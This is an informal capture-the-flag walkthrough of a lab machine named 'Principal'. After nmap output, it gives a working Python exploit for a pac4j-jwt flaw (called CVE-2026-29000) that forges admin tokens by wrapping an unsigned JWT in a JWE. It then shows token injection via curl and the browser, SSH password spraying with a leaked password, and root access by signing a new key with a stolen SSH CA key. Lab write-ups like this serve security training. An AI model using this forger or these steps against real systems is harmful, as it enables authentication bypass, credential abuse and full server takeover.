╰─$ nmap -sV -sC 10.129.244.220             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-16 02:12 CET
Nmap scan report for 10.129.244.220
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|_http-server-header: Jetty
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Mon, 16 Mar 2026 01:12:46 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-03-16T01:12:46.723+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Date: Mon, 16 Mar 2026 01:12:45 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 16 Mar 2026 01:12:45 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Mon, 16 Mar 2026 01:12:46 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 505 Unknown Version</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5: 
|     HTTP/1.1 400 Bad Request
|     Date: Mon, 16 Mar 2026 01:12:47 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.62 seconds



2) search for a poc for pac4j-jwt 6.0.3  and find the CVE-2026-29000  

make our custom tool with help or AI 

```python
#!/usr/bin/env python3
"""
CVE-2026-29000 - Manual JWE-wrapped PlainJWT forger
The vulnerability: pac4j-jwt accepts a JWE wrapping an *unsigned* (plain) JWT
Encryption: RSA-OAEP-256 + A128GCM using server's public key from JWKS
"""

import json
import time
import base64
import struct
import requests
import argparse
from jwcrypto import jwk, jwe
from jwcrypto.common import json_encode

def fetch_public_key(jwks_url):
    resp = requests.get(jwks_url, timeout=10)
    resp.raise_for_status()
    jwks_data = resp.json()
    # Pick first key (or filter by use=enc / kty=RSA)
    key_data = jwks_data["keys"][0]
    return jwk.JWK(**key_data)

def make_plain_jwt(claims: dict) -> str:
    """Build an unsigned (alg=none) JWT - the PlainJWT part of the CVE"""
    header = {"alg": "none"}
    def b64(data):
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
    
    return f"{b64(header)}.{b64(claims)}."  # empty signature

def forge_token(jwks_url, subject, role, issuer, exp_sec):
    print(f"[*] Fetching public key from {jwks_url}")
    pub_key = fetch_public_key(jwks_url)
    print(f"[+] Got key: kid={pub_key.get('kid', 'none')} kty={pub_key.get('kty')}")

    now = int(time.time())
    claims = {
        "sub": subject,
        "role": role,           # singular 'role' - matches server schema
        "iss": issuer,
        "iat": now,
        "exp": now + exp_sec
    }
    print(f"[*] Claims: {json.dumps(claims, indent=2)}")

    # Step 1: unsigned inner JWT
    plain_jwt = make_plain_jwt(claims)
    print(f"[*] PlainJWT: {plain_jwt[:60]}...")

    # Step 2: wrap in JWE - RSA-OAEP-256 + A128GCM
    jwe_token = jwe.JWE(
        plaintext=plain_jwt.encode(),
        protected=json_encode({
            "alg": "RSA-OAEP-256",
            "enc": "A128GCM",        # A128GCM - matches server requirement
            "cty": "JWT"             # content type = JWT (inner is a JWT)
        })
    )
    jwe_token.add_recipient(pub_key)
    token = jwe_token.serialize(compact=True)
    print(f"[+] Token ({len(token)} chars): {token[:60]}...")
    return token

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2026-29000 token forger")
    parser.add_argument("--jwks-url", required=True)
    parser.add_argument("--subject", default="admin")
    parser.add_argument("--role", default="ROLE_ADMIN")
    parser.add_argument("--iss", default="principal-platform")
    parser.add_argument("--exp-sec", type=int, default=3600)
    args = parser.parse_args()

    token = forge_token(args.jwks_url, args.subject, args.role, args.iss, args.exp_sec)
    print(f"\n[+] TOKEN:\n{token}")
```

TOKEN=$(python3 forge.py --jwks-url http://10.129.7.188:8080/api/auth/jwks --raw)
curl -H "Authorization: Bearer $TOKEN" http://10.129.7.188:8080/api/users    # work we access the api 


we will add this toke  i th boswer usigg the console

sessionStorage.setItem('auth_token', '<TOKEN>');

then we login as admin and enu the panel we find users and secrety key we will do password spry over this users lists 
$ nxc ssh 10.129.7.188  -u users.txt -p 'D3pl0y_$$H_Now42!'                                                                                                                              2 ↵
SSH         10.129.7.188    22     10.129.7.188     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
SSH         10.129.7.188    22     10.129.7.188     [-] admin:D3pl0y_$$H_Now42!
SSH         10.129.7.188    22     10.129.7.188     [+] svc-deploy:D3pl0y_$$H_Now42!  Linux - Shell access!






now we will login with ssh with svc-deploy:D3pl0y_$$H_Now42! creds


# priv esc

after run linpeas we find 
Readable files belonging to root and readable by me but not world readable :  /opt/principal/ssh/ca



we open /opt/principal/ssh


cd /opt/principal/ssh 
ls -la 


scp svc-deploy@10.129.7.188:/opt/principal/ssh/ca /home/kali/htb/Principal/priv

# craet a pviet + public key 
ssh-keygen -t ed25519 -f id_ed25519  -N ''  #->> id_ed25519.pub + id_ed25519 (privet)

# sign the public key with the CA privet key we get it from the target machine (/opt/principal/ssh/ca)
ssh-keygen -s ca -I "hacked by ahmed" -n root -V +30d id_ed25519.pub

# login using the signned public key 
ssh root@10.129.7.188 -i id_ed25519

